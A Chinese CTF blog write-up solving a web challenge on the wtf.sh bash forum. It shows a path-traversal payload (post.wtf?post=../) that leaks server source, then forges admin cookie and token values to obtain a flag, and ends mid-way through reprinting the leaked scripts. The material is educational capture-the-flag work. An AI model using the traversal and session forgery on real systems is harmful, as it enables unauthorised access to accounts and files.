<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    hostname: new URL('http://yoursite.com').hostname,
    root: '/',
    scheme: 'Gemini',
    version: '7.6.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","padding":18,"offset":20,"onmobile":false,"dimmer":true},
    copycode: {"enable":true,"show_result":true,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: true,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
  };
</script>

<script>
  (function(){
    if(''){
      if (prompt('请输入文章密码') !== ''){
        alert('密码错误！');
        history.back();
      }
    }
  })();
</script>


  <meta name="description" content="0x01 前要与心得 1.路径穿越 2.代码审计">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF攻防世界-WEB--ics-07">
<meta property="og:url" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/index.html">
<meta property="og:site_name" content="MR-eggegg">
<meta property="og:description" content="0x01 前要与心得 1.路径穿越 2.代码审计">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/1.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/2.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/3.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/4.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/6.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/7.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/8.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/9.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/10.PNG">
<meta property="og:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/11.PNG">
<meta property="article:published_time" content="2020-01-03T15:55:41.000Z">
<meta property="article:modified_time" content="2020-01-04T07:54:56.471Z">
<meta property="article:author" content="egg">
<meta property="article:tag" content="路径穿越">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2020/01/04/ctf-web-ics-07/1.PNG">

<link rel="canonical" href="http://yoursite.com/2020/01/04/ctf-web-ics-07/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true
  };
</script>

  <title>CTF攻防世界-WEB--ics-07 | MR-eggegg</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">MR-eggegg</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">boko</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-scategories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>scategories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="搜索..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/04/ctf-web-ics-07/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="egg">
      <meta itemprop="description" content="kobo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MR-eggegg">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CTF攻防世界-WEB--ics-07
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-01-04 00:55:41 / 修改时间：16:54:56" itemprop="dateCreated datePublished" datetime="2020-01-04T00:55:41+09:00">2020-01-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-WEB/" itemprop="url" rel="index">
                    <span itemprop="name">CTF-WEB</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <div class="note info"><p>0x01 前要与心得</p></div>
1.路径穿越</br>
2.代码审计

<a id="more"></a>

</br>

<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开网页，注册登录账号，随便看看源码，似乎也没什么破绽。看了看WP，应该是路径穿越漏洞。

<p><img src="1.PNG" alt=""></p>
</br>
2.尝试路径穿越，构造代码：
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post.wtf?post=../</span><br></pre></td></tr></table></figure></div>
</br>
3.出现源码泄露，尝试看看有没有flag找到代码，找到flag进行正规化。
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> user_functions.sh &lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span> $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>; $ get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span> $ post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>; $ <span class="keyword">done</span> $ <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>; $ <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]] $ <span class="keyword">then</span> $ get_flag1 $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> user_functions.sh </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">$ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span> </span><br><span class="line">$ <span class="keyword">then</span> </span><br><span class="line">$ <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>); </span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>;</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>; </span><br><span class="line">$ get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span> </span><br><span class="line">$	post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>); </span><br><span class="line">$	<span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">$ <span class="keyword">done</span> </span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>; </span><br><span class="line"><span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]] </span><br><span class="line">$ <span class="keyword">then</span> </span><br><span class="line">$	get_flag1 </span><br><span class="line">$ <span class="keyword">fi</span> </span><br><span class="line">$ <span class="keyword">fi</span> </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>3_1.大略可知当COOKIES[‘USERNAME’]}” = ‘admin’ ]] &amp;&amp; [[ ${username} = ‘admin’时，可以获得flag1,并且存在../users/这个路径可以尝试穿越</p>
</br>
4.
</br>
4.进入users子目录，正好找到里面有admin账号的信息，第一行为cookie，第二行是TOKEN

<p><img src="2.PNG" alt=""></p>
<p>4_1.抓包，利用Burp Suite伪造请求：   可以获得flag1<br><img src="3.PNG" alt=""><br><img src="4.PNG" alt=""></p>
<p>5.继续寻找flag2，可是说是毫无线索了，查看WP，知道是wtf控制服务器，reply存在上传漏洞<br>5_1.不过还是闲着无聊，看看其他代码都在干嘛<br>(1)大体是控制用户登出</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; $ <span class="built_in">source</span> user_functions.sh &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Welcome to the wtf.sh Forums!&lt;/h1&gt; $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Hi, <span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>. &lt;a href='/logout.wtf'&gt;Logout&lt;/a&gt; &lt;a href='/profile.wtf?user=<span class="variable">$(basename $(find_user_file $&#123;COOKIES['USERNAME']&#125;)</span>)'&gt;Profile&lt;/a&gt;&lt;/p&gt;"</span> $ <span class="built_in">echo</span> <span class="string">"&lt;a href=/new_post.wtf&gt;New Post&lt;/a&gt;"</span>; $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"&lt;p&gt;You're not logged in. &lt;a href='/login.wtf'&gt;Login&lt;/a&gt; &lt;a href='/new_user.wtf'&gt;Register&lt;/a&gt;&lt;/p&gt;"</span> $ <span class="keyword">fi</span> &lt;h3&gt;Posts:&lt;/h3&gt; &lt;ol&gt; $ <span class="keyword">if</span> [[ -e .index_cache.html ]] $ <span class="keyword">then</span> $ cat .index_cache.html; $ <span class="keyword">else</span> $ <span class="keyword">for</span> post_file <span class="keyword">in</span> posts/*; <span class="keyword">do</span> $ post_file=$(basename <span class="variable">$post_file</span>); $ post_title=$(nth_line 2 &lt; posts/<span class="variable">$post_file</span> | htmlentities); $ post_user=$(nth_line 1 &lt; posts/<span class="variable">$post_file</span> | htmlentities); $ <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$post_file</span>\"&gt;<span class="variable">$post_title</span>&lt;/a&gt; by <span class="variable">$&#123;post_user&#125;</span>&lt;/li&gt;"</span>; $ <span class="keyword">done</span>; $ <span class="keyword">fi</span> &lt;/ol&gt; &lt;/body&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(2)比对功能，寻找合适的命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Some useful standard functions to have around :) # check if an array contains a given value # contains "asdf" "asdf an array of values" =&gt; has exit code 0 function contains &#123; local e; for e in "$&#123;@:2&#125;"; do [[ "$e" == "$1" ]] &amp;&amp; return 0; done; return 1; &#125; function file_exists &#123; local file=$1; stat $&#123;file&#125; &gt; /dev/null; &#125; function nth_line &#123; local n=$1; local filename; if [[ $# != 1 ]] then filename=$2; sed "$&#123;n&#125;q;d" &lt; $filename; else sed "$&#123;n&#125;q;d" fi 2&gt; /dev/null &#125; function redirect &#123; local target="$1"; echo "&lt;script&gt;window.location.href='$&#123;target&#125;';&lt;/script&gt;"; &#125; # Hacky way of figuring out which date command is appropriate, # depending if we're on BSD or GNU coreutils YESTERDAY_CMD=""; TOMORROW_CMD=""; if date --help | grep "GNU" &gt; /dev/null then # Using GNU date TOMORROW_CMD="date -d tomorrow"; YESTERDAY_CMD="date -d yesterday"; else # Using BSD date TOMORROW_CMD="date -v +1d"; YESTERDAY_CMD="date -v -1d"; fi function set_cookie &#123; local key="$1"; local value="$2"; local expiry=$($&#123;TOMORROW_CMD&#125;); echo "&lt;script&gt;document.cookie = '$&#123;key&#125;=$&#123;value&#125;; expires=$&#123;expiry&#125;; path=/';&lt;/script&gt;"; COOKIES[$key]="$&#123;value&#125;"; &#125; function get_cookie &#123; echo "$&#123;COOKIES[$1]&#125;"; &#125; function remove_cookie &#123; local key="$1"; local expiry=$($&#123;YESTERDAY_CMD&#125;); # expiration dates in the past delete cookies echo "&lt;script&gt;document.cookie = '$&#123;key&#125;=riperino; expires=$&#123;expiry&#125;; path=/';&lt;/script&gt;"; unset COOKIES[$key]; &#125; # take text on input, transform any html special chars to the corresponding entities function htmlentities &#123; sed "s/\&amp;/\&amp;amp;/g" | sed "s/&lt;/\&amp;lt;/g" | sed "s/&gt;/\&amp;gt;/g"; &#125;</span></span><br></pre></td></tr></table></figure></div>
<p>(3)对比本地密码，这是最开始玩家创建账号时候，登陆账号时候进行验证</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=<span class="variable">$&#123;POST_PARAMS['username']&#125;</span>; $ <span class="built_in">local</span> password=<span class="variable">$&#123;POST_PARAMS['password']&#125;</span>; $ <span class="built_in">local</span> userfile=$(find_user_file <span class="variable">$&#123;username&#125;</span>); $ <span class="keyword">if</span> [[ <span class="variable">$&#123;userfile&#125;</span> != <span class="string">'NONE'</span> ]] $ <span class="keyword">then</span> $ <span class="comment"># User exists, try to login $ if $(check_password $&#123;username&#125; $&#123;password&#125;) $ then $ # correct pass $ set_cookie "USERNAME" $&#123;username&#125;; $ set_cookie "TOKEN" $(nth_line 3 $&#123;userfile&#125;); $ redirect "/"; $ else $ # incorrect pass $ echo "&lt;h3&gt;Sorry, wrong password for user $&#123;username&#125;:(&lt;br&gt;Try again?&lt;/h3&gt;"; $ fi $ else $ # user doesn't exist $ echo "&lt;h3&gt;Sorry, user $&#123;username&#125; doesn't exist :(&lt;br&gt;Try again?&lt;/h3&gt;" $ fi $ fi &lt;h3&gt;Login&lt;/h3&gt; &lt;form method=POST&gt; &lt;input type=text name=username placeholder="username"&gt;&lt;/input&gt;&lt;br&gt; &lt;input type=password name=password placeholder="password"&gt;&lt;/input&gt;&lt;br&gt; &lt;button type=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>(4)注销账号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ remove_cookie <span class="string">'USERNAME'</span>; $ remove_cookie <span class="string">'TOKEN'</span>; $ redirect <span class="string">"/"</span>; $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;You need to be logged in to log out, bud.&lt;/h3&gt;"</span>; $ <span class="keyword">fi</span> &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(5)感觉是对一开始登陆评论时候的控制</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="built_in">source</span> post_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ post_id=$(create_post <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;POST_PARAMS['title']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;POST_PARAMS['text']&#125;</span>"</span>); $ redirect <span class="string">"/post.wtf?post=<span class="variable">$&#123;post_id&#125;</span>"</span>; $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;pls login 2 be posting&lt;/h3&gt;"</span>; $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> &lt;form method=POST&gt; &lt;input <span class="built_in">type</span>=text name=title placeholder=<span class="string">"Post Title"</span>&gt;&lt;/input&gt;&lt;br&gt; &lt;textarea name=text placeholder=<span class="string">"Post Text"</span>&gt;&lt;/textarea&gt;&lt;br&gt; &lt;button <span class="built_in">type</span>=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(6)注册账号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=<span class="variable">$&#123;POST_PARAMS['username']&#125;</span>; $ <span class="built_in">local</span> password=<span class="variable">$&#123;POST_PARAMS['password']&#125;</span>; $ <span class="keyword">if</span> [[ $(find_user_file <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span>) = <span class="string">'NONE'</span> ]] $ <span class="keyword">then</span> $ <span class="comment"># create user $ echo "ok, gonna go make that user... $&#123;username&#125;"; $ local user_id=$(create_user "$&#123;username&#125;" "$&#123;password&#125;"); $ redirect "/login.wtf"; $ else $ # user already exists $ echo "&lt;h3&gt;Sorry, user $&#123;username&#125; already exists :(&lt;br&gt;Try again?&lt;/h3&gt;" $ fi $ fi &lt;h3&gt;Register&lt;/h3&gt; &lt;form method=POST&gt; &lt;input type=text name=username placeholder="username"&gt;&lt;/input&gt;&lt;br&gt; &lt;input type=password name=password placeholder="password"&gt;&lt;/input&gt;&lt;br&gt; &lt;button type=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>(7)帖子查询控制</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/post.css"</span> &gt; &lt;/head&gt; &lt;body&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> contains <span class="string">'post'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"posts/<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>"</span> $ <span class="keyword">then</span> $ post_id=<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>; $ <span class="keyword">for</span> post_file <span class="keyword">in</span> $(ls posts/<span class="variable">$&#123;post_id&#125;</span>/* | sort --field-separator=<span class="string">'/'</span> --key=3 -n); <span class="keyword">do</span> $ <span class="built_in">echo</span> <span class="string">"&lt;div class=\"post\"&gt;"</span>; $ poster=$(nth_line 1 <span class="variable">$&#123;post_file&#125;</span> | htmlentities); $ title=$(nth_line 2 <span class="variable">$&#123;post_file&#125;</span> | htmlentities); $ body=$(tail -n +3 <span class="variable">$&#123;post_file&#125;</span> | htmlentities 2&gt; /dev/null); $ <span class="built_in">echo</span> <span class="string">"&lt;span class=\"post-poster\"&gt;Posted by &lt;a href=\"/profile.wtf?user=<span class="variable">$(basename $(find_user_file "$&#123;poster&#125;")</span>)\"&gt;<span class="variable">$&#123;poster&#125;</span>&lt;/a&gt;&lt;/span&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;span class=\"post-title\"&gt;<span class="variable">$title</span>&lt;/span&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;span class=\"post-body\"&gt;<span class="variable">$body</span>&lt;/span&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;/div&gt;"</span>; $ <span class="keyword">done</span> $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"Pls give a (valid) post id"</span>; $ <span class="keyword">fi</span>; &lt;div class=<span class="string">"action-btns"</span>&gt; $ <span class="built_in">echo</span> <span class="string">"&lt;a href=\"/reply.wtf?post=<span class="variable">$&#123;post_id&#125;</span>\"&gt;Reply&lt;/a&gt;"</span> &lt;a href=<span class="string">"/"</span>&gt;Back&lt;/a&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(8)创建一个新的帖子，并且管理用户id，这里我们在后面会用到reply功能对比，最终淘汰此方案</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> user_functions.sh <span class="comment"># Create a new post. Returns the post id. function create_post &#123; local username=$1; local title=$2; local text=$3; local hashed=$(hash_username "$&#123;username&#125;"); # ensure posts dir exists and isn't listable. mkdir posts 2&gt; /dev/null; touch posts/.nolist; # don't allow directory listing on posts touch posts/.noread; # don't allow file reads on post local post_id=$(basename $(mktemp --directory posts/XXXXX)); echo $&#123;username&#125; &gt; "posts/$&#123;post_id&#125;/1"; echo $&#123;title&#125; &gt;&gt; "posts/$&#123;post_id&#125;/1"; echo $&#123;text&#125; &gt;&gt; "posts/$&#123;post_id&#125;/1"; touch "posts/$&#123;post_id&#125;/.nolist"; touch "posts/$&#123;post_id&#125;/.noread"; # add to our cache for the homepage echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=$&#123;post_id&#125;\"&gt;$(htmlentities &lt;&lt;&lt; $&#123;title&#125;)&lt;/a&gt; by $(htmlentities &lt;&lt;&lt; $&#123;username&#125;)&lt;/li&gt;" 